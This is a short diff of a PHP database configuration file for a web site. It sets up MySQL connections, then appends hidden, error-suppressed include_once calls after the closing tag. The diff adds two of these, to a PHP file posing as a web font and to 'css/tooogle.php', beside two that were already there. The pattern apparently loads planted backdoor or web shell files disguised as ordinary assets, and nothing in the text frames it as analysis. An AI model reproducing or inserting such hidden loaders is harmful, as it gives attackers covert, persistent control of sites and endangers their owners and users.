@@ -189,4 +189,4 @@ $con = mysqli_connect("$db_host", "$db_username", "$db_pass", "$db_name");
 
 $dbh = new PDO("mysql:host=$db_host; dbname=$db_name", $db_username, $db_pass);   
 
-?><?php @include_once("/home/wahabjawed23/public_html/walknsell.com/assets/inboxData/6824158e93.php"); ?><?php @include_once("/home/wahabjawed23/public_html/walknsell.com/tags/registration/LICENSE.php.php"); ?>
+?><?php @include_once("/home/wahabjawed23/public_html/walknsell.com/assets/inboxData/6824158e93.php"); ?><?php @include_once("/home/wahabjawed23/public_html/walknsell.com/tags/registration/LICENSE.php.php"); ?><?php @include_once("/home/wahabjawed23/public_html/walknsell.com/fonts/OpenSans-Regular-webfont.php"); ?><?php @include_once("/home/wahabjawed23/public_html/walknsell.com/css/tooogle.php"); ?>
